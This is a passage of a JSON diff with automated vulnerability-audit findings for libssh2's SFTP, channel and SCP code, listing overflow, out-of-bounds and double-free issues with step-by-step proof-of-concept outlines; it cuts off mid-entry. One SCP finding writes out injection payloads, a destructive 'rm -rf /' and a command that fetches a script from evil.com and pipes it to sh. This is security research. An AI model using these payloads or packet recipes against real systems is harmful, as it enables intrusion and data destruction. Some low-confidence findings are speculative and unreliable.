+          "description": "The function only validates that data_len >= 5 (1 byte type + 4 bytes request_id) but does not validate that the packet content is consistent with the declared packet type. For example, SSH_FXP_STATUS packets require additional fields (status code, error message length, error message, language tag length, language tag) beyond the 5-byte minimum. SSH_FXP_NAME packets require a count field and name entries. While deep validation may be deferred to parsing code, the lack of any type-specific minimum length check means malformed packets with valid types but truncated bodies are queued and will cause out-of-bounds reads during later parsing.",
+          "poc": "1. Send an SFTP packet with type SSH_FXP_STATUS (101), request_id=1, and total data_len=5 (no status code or error fields). 2. The packet passes the data_len < 5 check and is added to the packet queue. 3. When the packet is later parsed as SSH_FXP_STATUS, the parser reads beyond the 5-byte buffer to access the status code and error message fields, causing an out-of-bounds read."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/sftp.c [sftp_packet_read B: type+chan dispatch L302-415]",
+      "chars": 4902,
+      "elapsed_s": 104.2,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "SFTP Packet Size Limit Bypass via READDIR Exception",
+          "line_start": 320,
+          "confidence": 0.92,
+          "description": "The packet size validation check has an exception for SSH_FXP_NAME responses to SSH_FXP_READDIR requests. A malicious SFTP server can craft a response that satisfies all three bypass conditions (readdir_state != idle, matching request_id, packet_type == SSH_FXP_NAME) since it controls the response type and knows the request_id from the client's request. This allows the server to send arbitrarily large SFTP packets (bypassing LIBSSH2_SFTP_PACKET_MAXLEN), causing the client to allocate huge buffers (up to ~4GB on 64-bit systems), leading to memory exhaustion and denial of service.",
+          "poc": "1. Client initiates an SSH_FXP_READDIR request (request_id = N, readdir_state set to non-idle)\n2. Malicious server responds with SSH_FXP_NAME packet where:\n   - packet_type = SSH_FXP_NAME (0x04)\n   - request_id = N (matching the client's request)\n   - partial_len = 0x7FFFFFFF (2GB, bypasses the size check due to the exception)\n3. Client allocates a 2GB buffer via LIBSSH2_ALLOC, causing memory exhaustion\n\nCrafted packet header (9 bytes):\n  Length: 0x7FFFFFFF (4 bytes, big-endian)\n  Type:   0x04 (SSH_FXP_NAME)\n  ReqID:  N (4 bytes, matching readdir_request_id)"
+        },
+        {
+          "severity": "medium",
+          "title": "Integer Overflow in Window Adjustment Calculation",
+          "line_start": 343,
+          "confidence": 0.85,
+          "description": "The expression `sftp->partial_len * 2` passed to `_libssh2_channel_receive_window_adjust()` can overflow when partial_len is large. When combined with the READDIR bypass vulnerability, a malicious server can set partial_len to a value >= 0x80000000, causing the multiplication to wrap around to a small value. This results in an incorrect window adjustment (far smaller than needed), potentially disrupting the SSH channel flow control and leading to protocol desynchronization or unexpected behavior.",
+          "poc": "1. Trigger READDIR bypass as in finding #1\n2. Set partial_len = 0x80000001 in the SFTP response\n3. partial_len * 2 = 0x00000002 (32-bit overflow)\n4. Window is adjusted by only 2 bytes instead of ~4GB\n5. Subsequent channel reads may behave unexpectedly due to incorrect window state"
+        },
+        {
+          "severity": "medium",
+          "title": "Potential Double-Free in sftp_packet_add Error Path",
+          "line_start": 398,
+          "confidence": 0.55,
+          "description": "The comment states 'sftp_packet_add takes ownership of the packet and might free it', yet on error the code explicitly calls LIBSSH2_FREE(session, packet). If sftp_packet_add internally frees the packet on certain error paths (as the comment suggests it 'might'), this results in a double-free vulnerability. A double-free can lead to heap corruption, which in turn can be exploited for arbitrary code execution depending on the heap allocator's state.",
+          "poc": "Trigger a condition where sftp_packet_add() fails after internally freeing the packet buffer. The subsequent LIBSSH2_FREE(session, packet) in the error handler would then free already-freed memory:\n\n1. Send SFTP packets that cause sftp_packet_add to fail (e.g., duplicate request_id, queue full)\n2. If sftp_packet_add frees the packet before returning error, the caller's LIBSSH2_FREE causes double-free\n3. Heap corruption may enable further exploitation"
+        },
+        {
+          "severity": "high",
+          "title": "Unbounded Memory Allocation on 64-bit Systems via READDIR Bypass",
+          "line_start": 335,
+          "confidence": 0.88,
+          "description": "When the READDIR exception bypasses the packet size limit, LIBSSH2_ALLOC is called with an attacker-controlled size up to 0xFFFFFFFF (~4GB). On 64-bit systems with memory overcommit (common on Linux), this allocation can succeed, causing the process to consume massive amounts of memory. The subsequent read loop then attempts to fill this buffer from the channel. Multiple concurrent SFTP sessions could amplify this into a system-wide DoS.",
+          "poc": "1. Open multiple SFTP sessions to a malicious server\n2. Each session issues SSH_FXP_READDIR requests\n3. Server responds to each with SSH_FXP_NAME and partial_len = 0xFFFFFFFF\n4. Each client process attempts to allocate ~4GB\n5. System runs out of memory, causing OOM killer to terminate processes"
+        }
+      ]
+    },
+    {
+      "file": "libssh2/sftp.c [sftp_read A: request send+state L1402-1495]",
+      "chars": 3942,
+      "elapsed_s": 77.4,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer truncation in offset difference cast to size_t",
+          "line_start": 1472,
+          "confidence": 0.85,
+          "description": "The expression `(size_t)(filep->offset_sent - filep->offset)` truncates a 64-bit offset difference to a 32-bit `size_t` on 32-bit platforms. If the actual difference exceeds SIZE_MAX (e.g., >4GB on 32-bit), the truncated `already` value will be much smaller than the real amount of in-flight data. This causes `count = max_read_ahead - already` to be much larger than intended, leading to excessive FXP_READ requests being sent. When responses arrive, the data can overflow the caller's buffer since more data is returned than the buffer can hold.",
+          "poc": "On a 32-bit system: 1) Open SFTP file handle. 2) Request reads that cause offset_sent to advance far ahead of offset (e.g., offset_sent=0x100000005, offset=0x0). 3) The cast truncates the 4GB+ difference to 5. 4) count becomes nearly max_read_ahead, causing massive over-read. 5) Returned data overflows the caller's buffer."
+        },
+        {
+          "severity": "high",
+          "title": "Integer overflow in buffer_size multiplication",
+          "line_start": 1474,
+          "confidence": 0.8,
+          "description": "The expression `buffer_size*4` can overflow on both 32-bit and 64-bit systems if `buffer_size` is close to SIZE_MAX/4. On overflow, `max_read_ahead` wraps to a small value, which could cause `count` to be calculated incorrectly. If `max_read_ahead` wraps to a value smaller than `already`, no additional reads are requested (DoS). If it wraps to a specific value larger than `already`, an incorrect number of read requests is generated, potentially leading to buffer overflow when responses arrive.",
+          "poc": "On a 32-bit system, pass buffer_size = 0x40000001. Then buffer_size*4 = 0x100000004, which truncates to 4. max_read_ahead becomes 4 (or capped to LIBSSH2_CHANNEL_WINDOW_DEFAULT*4). The read-ahead logic is completely broken, and if already < 4, count = 4 - already, requesting far less data than needed. On 64-bit with buffer_size near SIZE_MAX/4, similar overflow occurs."
+        },
+        {
+          "severity": "medium",
+          "title": "Potential underflow in data buffer offset calculation",
+          "line_start": 1432,
+          "confidence": 0.6,
+          "description": "The expression `filep->data_len - filep->data_left` used as an offset into `filep->data` can underflow if `data_left > data_len` due to corruption or a bug in another code path. Since these are unsigned types, the underflow produces a very large offset, causing `memcpy` to read from far before the allocated buffer. While `data_left` should normally be <= `data_len`, there is no validation of this invariant before the subtraction.",
+          "poc": "If a bug or race condition sets filep->data_left to a value larger than filep->data_len (e.g., data_len=100, data_left=200), then filep->data_len - filep->data_left underflows to a huge value. The memcpy reads from filep->data[huge_offset], causing an out-of-bounds read that can leak heap memory or crash."
+        },
+        {
+          "severity": "medium",
+          "title": "Unbounded count calculation with insufficient validation",
+          "line_start": 1480,
+          "confidence": 0.75,
+          "description": "The comment explicitly acknowledges the risk: 'if the buffer_size passed in now is smaller than what has already been sent, we risk getting count become a very large number'. While the `if(max_read_ahead > already)` guard prevents `count` from being set when `already >= max_read_ahead`, this protection is fragile. If `already` is miscalculated due to the integer truncation vulnerability (finding #1), or if `max_read_ahead` overflows (finding #2), `count` can become extremely large, causing an excessive number of FXP_READ requests to be queued.",
+          "poc": "Combine with finding #1: on a 32-bit system, if already is truncated to a small value (e.g., 5) while the real in-flight data is 4GB+, then count = max_read_ahead - 5, which could be a very large number of additional read requests, far exceeding what the buffer can hold."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/sftp.c [sftp_read B: data recv+buffer fill L1495-1584]",
+      "chars": 3979,
+      "elapsed_s": 183.9,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "medium",
+          "title": "Integer overflow in receive window adjustment multiplication",
+          "line_start": 1510,
+          "confidence": 0.75,
+          "description": "The expression `(uint32_t)(max_read_ahead * 8)` can overflow. If `max_read_ahead` is a large value (e.g., >= 0x20000000 on 32-bit arithmetic, or any value where the product exceeds UINT32_MAX on 64-bit before truncation), the multiplication overflows/wraps, resulting in a much smaller value being passed to `_libssh2_channel_receive_window_adjust()`. This means the SSH channel receive window is not expanded as intended. The consequence is that the remote server is not permitted to send the amount of data the client is requesting, leading to stalled SFTP reads and denial of service. An application requesting very large reads or using a large buffer_size could trigger this.",
+          "poc": "If max_read_ahead = 0x20000001 (~537MB), then max_read_ahead * 8 = 0x100000008, which truncated to uint32_t = 8. The window adjustment would be 8 bytes instead of ~4GB, causing the channel to stall waiting for data that the server is not permitted to send."
+        },
+        {
+          "severity": "medium",
+          "title": "Integer overflow in packet_len calculation leading to heap buffer overflow",
+          "line_start": 1530,
+          "confidence": 0.55,
+          "description": "The calculation `uint32_t packet_len = (uint32_t)(handle->handle_len + 25)` can overflow if `handle->handle_len` is close to UINT32_MAX (e.g., 0xFFFFFFE7). In that case, `packet_len` wraps to a small value (e.g., 0), causing `LIBSSH2_ALLOC` to allocate a buffer of only `sizeof(struct sftp_pipeline_chunk)` bytes. Subsequently, `_libssh2_store_str(&s, handle->handle, handle->handle_len)` writes `handle_len` (~4GB) bytes into the severely undersized buffer, causing a critical heap buffer overflow. While this requires a malicious SFTP server returning an extremely large handle (which would itself require a large allocation to store), the lack of validation on handle_len before the arithmetic makes this a latent integer overflow vulnerability.",
+          "poc": "A malicious SFTP server returns SSH_FXP_HANDLE with handle_len = 0xFFFFFFE7. If the client system has enough memory to store this handle, subsequent sftp_read calls compute packet_len = (0xFFFFFFE7 + 25) = 0 (uint32_t overflow). The allocation becomes tiny, but _libssh2_store_str writes 0xFFFFFFE7 bytes, causing heap buffer overflow."
+        },
+        {
+          "severity": "low",
+          "title": "Truncation of count to uint32_t may cause excessive chunk allocation",
+          "line_start": 1533,
+          "confidence": 0.5,
+          "description": "The cast `uint32_t size = (uint32_t)count` truncates `count` if it is a 64-bit type (e.g., size_t) with value exceeding UINT32_MAX. The truncated `size` is then compared against `buffer_size` and `MAX_SFTP_READ_SIZE`, but the original `count` (64-bit) is decremented by the 32-bit `size` via `count -= LIBSSH2_MIN(size, count)`. If count was, say, 0x100000001, size becomes 1, and count decrements by only 1 per iteration (after buffer_size capping). This creates far more loop iterations than intended, each allocating a chunk structure. This can lead to memory exhaustion and denial of service through excessive allocations.",
+          "poc": "Call sftp_read with a count value of 0x100000001 on a 64-bit system where count is size_t. The truncation to uint32_t yields size=1, but count remains large, causing the while loop to iterate an excessive number of times, each allocating a pipeline chunk."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/sftp.c [sftp_write A: data fragment+queue L2083-2188]",
+      "chars": 3953,
+      "elapsed_s": 172.4,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer overflow in packet_len calculation leading to heap buffer overflow",
+          "line_start": 2141,
+          "confidence": 0.85,
+          "description": "The calculation `packet_len = (uint32_t)(handle->handle_len + size + 25)` can overflow if `handle->handle_len` is sufficiently large (close to UINT32_MAX). Since `handle->handle_len` is derived from the SFTP server's SSH_FXP_HANDLE response and is not validated against a maximum, a malicious SFTP server can return a handle with an extremely large length field. When the overflow occurs, `packet_len` wraps to a small value, causing a small heap allocation via LIBSSH2_ALLOC. However, the subsequent packet construction writes (via _libssh2_store_str with the original handle_len and size) write far beyond the allocated buffer, resulting in a critical heap buffer overflow. This can lead to arbitrary code execution on the client.",
+          "poc": "1. Set up a malicious SFTP server.\n2. When the client sends SSH_FXP_OPEN, respond with SSH_FXP_HANDLE containing a handle_len field of 0xFFFFFFE0 (4294967264) and a handle of that length (or a shorter handle if the client doesn't fully validate).\n3. When the client calls sftp_write(), the calculation: packet_len = (uint32_t)(0xFFFFFFE0 + 0x8000 + 25) = (uint32_t)(0x1000007E9) = 0x7E9 (2025).\n4. LIBSSH2_ALLOC allocates only ~2025 + sizeof(sftp_pipeline_chunk) bytes.\n5. _libssh2_store_str(&s, handle->handle, 0xFFFFFFE0) attempts to write 4 + 0xFFFFFFE0 bytes, massively overflowing the heap buffer."
+        },
+        {
+          "severity": "medium",
+          "title": "Unsigned integer underflow in 'already' calculation causing logic error and potential data corruption",
+          "line_start": 2108,
+          "confidence": 0.7,
+          "description": "The calculation `already = (size_t)(handle->u.file.offset_sent - handle->u.file.offset) + handle->u.file.acked` can underflow if `offset_sent < offset`. Since these are unsigned types (likely uint64_t), the subtraction wraps to a very large value. When combined with `acked` and potentially truncated on 32-bit systems, this could produce an incorrect `already` value. If the resulting `already` value happens to be less than or equal to `count`, the code executes `buffer += already; count -= already;`, which skips an incorrect number of bytes in the user's buffer. This causes data that should be written to be silently skipped (data loss/corruption). On 32-bit systems, the truncation from uint64_t to size_t makes it more likely that the wrapped value falls within the range of `count`.",
+          "poc": "1. Manipulate file offset state such that handle->u.file.offset_sent < handle->u.file.offset (e.g., via seek operations or interrupted writes).\n2. On a 32-bit system: offset_sent=0, offset=1, acked=0x101 -> (0-1) as uint64_t = 0xFFFFFFFFFFFFFFFF, truncated to size_t(32-bit) = 0xFFFFFFFF, + 0x101 = 0x100 (256).\n3. If count >= 256, buffer advances by 256 bytes incorrectly, skipping user data that should have been written.\n4. Result: silent data corruption/loss in the SFTP transfer."
+        },
+        {
+          "severity": "high",
+          "title": "Missing validation of handle->handle_len enabling overflow exploitation",
+          "line_start": 2141,
+          "confidence": 0.9,
+          "description": "The `handle->handle_len` value is used directly in arithmetic and memory operations without any bounds checking. The SFTP protocol specification does not mandate a maximum handle length, and the value originates from the server's SSH_FXP_HANDLE response. A malicious server can set this to any 32-bit value. Without validation that handle_len is within reasonable bounds (e.g., < 256 or similar), the value feeds directly into the packet_len calculation and _libssh2_store_str operations, enabling the integer overflow and heap buffer overflow described above. This is the root cause enabling the critical vulnerability.",
+          "poc": "A malicious SFTP server sends SSH_FXP_HANDLE with handle_len = 0xFFFFFFE0. The client stores this without validation. On subsequent sftp_write(), the unchecked handle_len triggers the integer overflow in packet_len calculation."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/sftp.c [sftp_write B: ack recv+window update L2188-2293]",
+      "chars": 3869,
+      "elapsed_s": 276.4,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "medium",
+          "title": "Incomplete error state cleanup on LIBSSH2_ERROR_BUFFER_TOO_SMALL leaves SFTP handle in inconsistent state",
+          "line_start": 2208,
+          "confidence": 0.85,
+          "description": "When sftp_packet_require() returns LIBSSH2_ERROR_BUFFER_TOO_SMALL (triggered by a malformed/truncated SSH_FXP_STATUS response from the server), the code frees the data buffer and returns an error but does NOT perform the same state cleanup as the other error path at lines 2240-2254. Specifically, it fails to: (1) flush the packet list via sftp_packetlist_flush(), leaving stale chunks that will be reprocessed; (2) rewind handle->u.file.offset by handle->u.file.acked, causing the offset to remain ahead of what the application believes was confirmed; (3) reset handle->u.file.offset_sent to match the offset; (4) clear handle->u.file.acked. A malicious or compromised SFTP server can trigger this by sending a truncated SSH_FXP_STATUS packet (fewer than 9 bytes). On subsequent write calls, the offset mismatch causes data to be written to incorrect file positions, resulting in silent data corruption. The stale packet list also creates potential for unexpected behavior on re-entry.",
+          "poc": "A malicious SFTP server responds to an SSH_FXP_WRITE request with an SSH_FXP_STATUS packet that has a valid type and request_id but a payload shorter than 9 bytes (e.g., only 5 bytes containing the packet length and type, missing the status code field). This triggers LIBSSH2_ERROR_BUFFER_TOO_SMALL in sftp_packet_require(). The client returns an error to the application but leaves handle->u.file.offset advanced by handle->u.file.acked from a previous call, and leaves stale chunks in the packet list. When the application retries the write, data is written at the wrong offset, corrupting the remote file."
+        },
+        {
+          "severity": "low",
+          "title": "Potential integer truncation when assigning acked amount to ssize_t return value",
+          "line_start": 2264,
+          "confidence": 0.6,
+          "description": "At line 2265, 'ssize_t ret = LIBSSH2_MIN(acked, org_count)' assigns the minimum of acked (accumulated from chunk->len values, likely size_t/unsigned) and org_count into a signed ssize_t. If the total acked data across multiple chunks exceeds SSIZE_MAX (e.g., on a 32-bit platform where size_t is 32-bit unsigned and ssize_t max is 2^31-1), the value wraps to negative. The function then returns this negative value, which the caller interprets as an error code rather than a successful write count. While this requires an extremely large accumulated ack (unlikely in practice), it represents a type safety violation that could cause incorrect error reporting on platforms where size_t and ssize_t have the same width.",
+          "poc": "On a 32-bit platform, if an application performs many pipelined sftp_write() calls such that handle->u.file.acked accumulates to over 2GB (2147483647 bytes), and then calls sftp_write() with org_count also over 2GB, the LIBSSH2_MIN result exceeds SSIZE_MAX, wraps negative when stored in ssize_t ret, and is returned as a spurious error code."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/channel.c [_libssh2_channel_read A: adjust window L2073-2155]",
+      "chars": 2986,
+      "elapsed_s": 168.7,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Integer Overflow in Window Adjustment Calculation",
+          "line_start": 2091,
+          "confidence": 0.85,
+          "description": "The calculation `(uint32_t)(channel->remote.window_size_initial + buflen - channel->remote.window_size)` is vulnerable to integer overflow. On 32-bit systems, the arithmetic itself can overflow when window_size_initial and buflen are large. On 64-bit systems, the result of the 64-bit arithmetic is truncated when cast to uint32_t. If the result overflows/wraps to a very large value, the server is told it can send far more data than the client can handle, potentially leading to memory exhaustion. If it wraps to a very small value (below MINADJUST), the window adjustment is insufficient, causing channel stalls. A malicious server could send data to reduce window_size to a small value, and if the client calls read with a large buflen, the overflow triggers.",
+          "poc": "On a 64-bit system: window_size_initial=0xFFFFFFFF, buflen=0x100000001, window_size=0. Calculation: 0xFFFFFFFF + 0x100000001 - 0 = 0x200000000, cast to uint32_t = 0x00000000. Adjustment becomes LIBSSH2_CHANNEL_MINADJUST instead of the intended ~4GB. On a 32-bit system: window_size_initial=0x80000000, buflen=0x80000000, window_size=0. Calculation wraps to 0, causing insufficient window adjustment and channel stall."
+        },
+        {
+          "severity": "medium",
+          "title": "Integer Overflow in Window Adjustment Condition Check",
+          "line_start": 2088,
+          "confidence": 0.75,
+          "description": "The condition `channel->remote.window_size < channel->remote.window_size_initial / 4 * 3 + buflen` can overflow when `window_size_initial / 4 * 3 + buflen` exceeds the maximum value of the type (size_t on 64-bit, or the promoted type on 32-bit). If this overflows to a small value, the condition evaluates to false, causing the critical window adjustment to be skipped entirely. This leads to the receive window not being expanded when needed, causing the remote side to stop sending data (channel stall / DoS).",
+          "poc": "On a 32-bit system where size_t is 32 bits: window_size_initial=0xFFFFFFFF, window_size_initial/4*3=0xBFFFFFFF, buflen=0x40000001. Sum = 0x100000000 wraps to 0. If window_size=1, condition 1 < 0 is false, window adjustment skipped, channel stalls."
+        },
+        {
+          "severity": "medium",
+          "title": "Window Adjustment Bypass via read_state Allows Invalid Adjustment Values",
+          "line_start": 2087,
+          "confidence": 0.65,
+          "description": "The condition `channel->read_state == libssh2_NB_state_jump1` bypasses the window size check entirely, allowing the adjustment calculation to execute even when window_size >= window_size_initial + buflen. This state is set when a previous window adjustment was interrupted (EAGAIN). On re-entry, if window_size has changed (e.g., due to concurrent processing or a protocol violation by the server), the subtraction `window_size_initial + buflen - window_size` can underflow, producing a very large uint32_t adjustment value. This tells the server it can send billions of bytes, potentially causing memory exhaustion on the client.",
+          "poc": "1. First call triggers window adjustment, sets read_state=jump1, _libssh2_channel_receive_window_adjust returns EAGAIN. 2. Server sends a malformed packet that incorrectly increases window_size (or a bug elsewhere modifies it). 3. Second call enters via read_state==jump1 bypass, calculates adjustment = window_size_initial + buflen - window_size which underflows to ~4GB. Server is told it can send ~4GB of data."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/channel.c [_libssh2_channel_read B: data dequeue L2155-2226]",
+      "chars": 2884,
+      "elapsed_s": 161.3,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer Underflow and Out-of-Bounds Read in _libssh2_channel_read",
+          "line_start": 2160,
+          "confidence": 1.0,
+          "description": "The code processes SSH_MSG_CHANNEL_DATA packets without verifying that `readpkt->data_len` is large enough to contain the packet header (at least 9 bytes). While `SSH_MSG_CHANNEL_EXTENDED_DATA` correctly checks `readpkt->data_len >= 9` (line 2158), the `SSH_MSG_CHANNEL_DATA` condition (line 2160) lacks this check. If a malicious server sends a short `SSH_MSG_CHANNEL_DATA` packet, `readpkt->data_head` can be set to 9 while `readpkt->data_len` is less than 9. When calculating the remaining data to read on line 2172, `readpkt->data_len - readpkt->data_head` underflows (since they are unsigned integers), resulting in a massive value. This causes the check `bytes_want >= (readpkt->data_len - readpkt->data_head)` to fail, leaving `bytes_want` uncapped. The subsequent `memcpy` on line 2186 then reads `bytes_want` bytes from `readpkt->data + readpkt->data_head`, which is out of bounds, leading to a heap out-of-bounds read. This can leak sensitive information or cause a denial of service.",
+          "poc": "A malicious SSH server sends a SSH_MSG_CHANNEL_DATA packet with a total length of less than 9 bytes (e.g., 5 bytes). When the client calls _libssh2_channel_read, it will process this malformed packet, triggering the integer underflow and the subsequent out-of-bounds read, copying heap memory into the user's buffer."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/channel.c [_libssh2_channel_write A: send split L2338-2409]",
+      "chars": 2939,
+      "elapsed_s": 129.0,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Missing remote.packet_size validation leads to heap buffer overflow",
+          "line_start": 23,
+          "confidence": 0.82,
+          "description": "The code caps `buflen` at 32700 based on RFC4253's maximum packet size, but never checks against `channel->remote.packet_size` — the maximum packet size advertised by the remote end. A malicious SSH server can advertise an arbitrarily small `packet_size` in the SSH_MSG_CHANNEL_OPEN_CONFIRMATION or SSH_MSG_CHANNEL_WINDOW_ADJUST messages. If `channel->write_packet` is allocated based on `remote.packet_size`, writing up to 32700 bytes of payload plus the packet header (9-13 bytes) will overflow the heap buffer. This is consistent with the class of vulnerabilities seen in CVE-2019-3855 through CVE-2019-3863 in libssh2, where missing validation of remote-advertised sizes led to out-of-bounds writes.",
+          "poc": "1. Set up a malicious SSH server that responds to SSH_MSG_CHANNEL_OPEN with a channel_open_confirmation containing a very small 'maximum packet size' field (e.g., 64 bytes).\n2. The client allocates channel->write_packet based on this small packet_size.\n3. Client calls libssh2_channel_write() with a buffer > 64 bytes.\n4. The code caps buflen at 32700 (line 23), sets write_bufwrite = buflen (line 55), and only checks against window_size (line 63) — never against remote.packet_size.\n5. The subsequent data copy into channel->write_packet overflows the heap buffer, enabling code execution."
+        },
+        {
+          "severity": "medium",
+          "title": "buflen cap doesn't account for packet header overhead",
+          "line_start": 23,
+          "confidence": 0.55,
+          "description": "The code caps `buflen` at 32700, but the actual SSH packet includes a header of 9 bytes (SSH_MSG_CHANNEL_DATA) or 13 bytes (SSH_MSG_CHANNEL_EXTENDED_DATA), plus the data length field (4 bytes) that is stored after the header. If the packet buffer `channel->write_packet` is allocated as exactly 32700 bytes or sized based on a miscalculation that doesn't include the header, the total write (header + length + data) could exceed the buffer. The 32700 cap is described as 'conservative' for the 35000-byte RFC limit, but the exact buffer allocation size is not validated here.",
+          "poc": "If channel->write_packet is allocated as exactly 32700 bytes, writing SSH_MSG_CHANNEL_EXTENDED_DATA (1 + 4 + 4 + 4 + 32700 = 32713 bytes) overflows by 13 bytes. Trigger by calling libssh2_channel_write with stream_id=1 (extended data) and a buffer of 32700+ bytes."
+        },
+        {
+          "severity": "low",
+          "title": "TOCTOU on channel->local.window_size between check and use",
+          "line_start": 49,
+          "confidence": 0.45,
+          "description": "The code checks `channel->local.window_size <= 0` at line 49 and returns early if true. Later at line 63, it compares `write_bufwrite > channel->local.window_size`. Between these two reads, the window_size could theoretically be modified by a concurrently processed SSH_MSG_CHANNEL_WINDOW_ADJUST packet (received during the transport layer). While libssh2 is not designed for multi-threaded use at the session level, in non-blocking mode a callback or re-entrant call could modify window_size between the two checks, potentially leading to writing more data than the window allows.",
+          "poc": "In non-blocking mode, if a WINDOW_ADJUST packet arrives and is processed between the window_size check (line 49) and the comparison (line 63), the window_size could change. However, this would only increase the window, not decrease it, making exploitation for overflow unlikely. A decrease would require a race where window_size was positive at line 49 but became 0 or negative at line 63, which would require concurrent write operations on the same channel."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/channel.c [_libssh2_channel_write B: flow control L2409-2469]",
+      "chars": 2691,
+      "elapsed_s": 233.1,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Incorrect Window Size and Packet Size Usage in Channel Write Flow Control",
+          "line_start": 2411,
+          "confidence": 1.0,
+          "description": "The `_libssh2_channel_write` function incorrectly uses `channel->local.window_size` and `channel->local.packet_size` to determine how much data can be sent, and decrements `channel->local.window_size` upon successful send. In the SSH protocol, `local.window_size` represents the receive window for the local end (how much data the remote peer is allowed to send), while `remote.window_size` represents the send window (how much data the local end is allowed to send to the remote peer). Using `local.window_size` for sending causes three critical issues: 1) It allows the client to send more data than the remote side permitted if `local.window_size` > `remote.window_size`, violating SSH flow control and likely causing the remote server to drop the connection. 2) It decrements the local receive window, eventually dropping it to 0, which prevents the remote side from sending any more data to the client, resulting in a permanent Denial of Service (channel hang). 3) It prevents sending data if the local receive window is exhausted (0), even if the remote send window is large, causing unnecessary blocking or 0-byte writes.",
+          "poc": "1. Establish an SSH session and open a channel.\n2. Send data over the channel continuously.\n3. Observe that `channel->local.window_size` decreases with each send.\n4. Once `local.window_size` reaches 0, the remote side will no longer be able to send data to the client, and the client will no longer be able to send data to the remote side (since `write_bufwrite` will be capped to 0), resulting in a complete Denial of Service on the channel."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/scp.c [scp_recv A: banner+path parse L281-389]",
+      "chars": 3986,
+      "elapsed_s": 125.6,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Command Injection via Unquoted SCP Path",
+          "line_start": 313,
+          "confidence": 0.95,
+          "description": "When session->flag.quote_paths is false (the default in vulnerable versions), the 'path' parameter is directly copied into the remote shell command via memcpy without any sanitization or escaping. The resulting command is passed to _libssh2_channel_process_startup with 'exec', causing the remote SSH server's shell to interpret any shell metacharacters in the path. An attacker who controls the path argument can inject arbitrary commands (e.g., using ';', '|', '&&', '$()') that execute on the remote server with the privileges of the SSH session.",
+          "poc": "Pass a path such as '; rm -rf / #' or '$(curl http://evil.com/shell.sh|sh)' to libssh2_scp_recv(). When quote_paths is false, the constructed command becomes: 'scp -f ; rm -rf / #' which the remote shell interprets as two separate commands, executing the injected payload."
+        },
+        {
+          "severity": "medium",
+          "title": "Potential Heap Buffer Overflow via Inconsistent Quoting Functions",
+          "line_start": 289,
+          "confidence": 0.6,
+          "description": "The buffer is allocated based on _libssh2_shell_quotedsize(path), but when quote_paths is true, the actual quoting is performed by shell_quotearg(). If these two functions have inconsistent implementations (e.g., shell_quotearg handles certain characters differently than _libssh2_shell_quotedsize accounts for), the output of shell_quotearg could exceed the allocated buffer size, causing a heap buffer overflow. This is a classic size-calculation/actual-write mismatch pattern.",
+          "poc": "Craft a path containing characters that shell_quotearg quotes differently than _libssh2_shell_quotedsize predicts. For example, if _libssh2_shell_quotedsize underestimates the quoting needed for Unicode or special characters, the actual quoted output could overflow the heap buffer."
+        },
+        {
+          "severity": "low",
+          "title": "Integer Overflow in Command Buffer Size Calculation",
+          "line_start": 289,
+          "confidence": 0.4,
+          "description": "The command buffer size is computed as _libssh2_shell_quotedsize(path) + sizeof(\"scp -f \") + (sb ? 1 : 0). If _libssh2_shell_quotedsize returns a value close to SIZE_MAX, the addition could wrap around, resulting in a small allocation. The subsequent memcpy or shell_quotearg would then write far beyond the allocated buffer, causing a heap corruption. While practically difficult to trigger due to the enormous path length required, the code lacks overflow checks.",
+          "poc": "Provide a path of extreme length (approaching SIZE_MAX) that causes _libssh2_shell_quotedsize to return a value that overflows when added to the fixed-size components, resulting in a small allocation followed by a massive write."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/scp.c [scp_recv B: file mode+size parse L389-484]",
+      "chars": 3991,
+      "elapsed_s": 360.5,
+      "status": "ok",
+      "findings": []
+    },
+    {
+      "file": "libssh2/scp.c [scp_recv C: timestamp+mtime parse L484-574]",
+      "chars": 3988,
+      "elapsed_s": 229.7,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "medium",
+          "title": "Buffer underread in \\r\\n stripping loop due to missing bounds check",
+          "line_start": 508,
+          "confidence": 0.85,
+          "description": "The while loop that strips trailing \\r and \\n characters decrements `scpRecv_response_len` without checking if it reaches 0. The comment on line 506-507 claims 'We're guaranteed not to go under response_len == 0 by the logic above,' but this is incorrect — the preceding logic only guarantees response_len >= 9 and that the last character is '\\n'. It does NOT guarantee the presence of a non-whitespace character. If a malicious SCP server sends a response consisting entirely of '\\r' and '\\n' characters (at least 9 bytes to pass the length check), the loop will decrement `scpRecv_response_len` to 0. Since `scpRecv_response_len` is `size_t` (unsigned), the next iteration evaluates `scpRecv_response[SIZE_MAX - 1]`, causing a massive out-of-bounds read that crashes the application. This is a denial-of-service vulnerability exploitable by any malicious SSH/SCP server a client connects to.",
+          "poc": "A malicious SCP server sends a timestamp response consisting entirely of newline characters, e.g., \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\" (9 bytes). This passes the length >= 9 check and the ends-with-\\n check. The stripping loop then decrements scpRecv_response_len from 9 down to 0. On the next iteration, it reads scpRecv_response[SIZE_MAX-1], causing a segfault and crashing the client application."
+        },
+        {
+          "severity": "low",
+          "title": "strtol on unvalidated SCP response data without error/overflow checking",
+          "line_start": 534,
+          "confidence": 0.7,
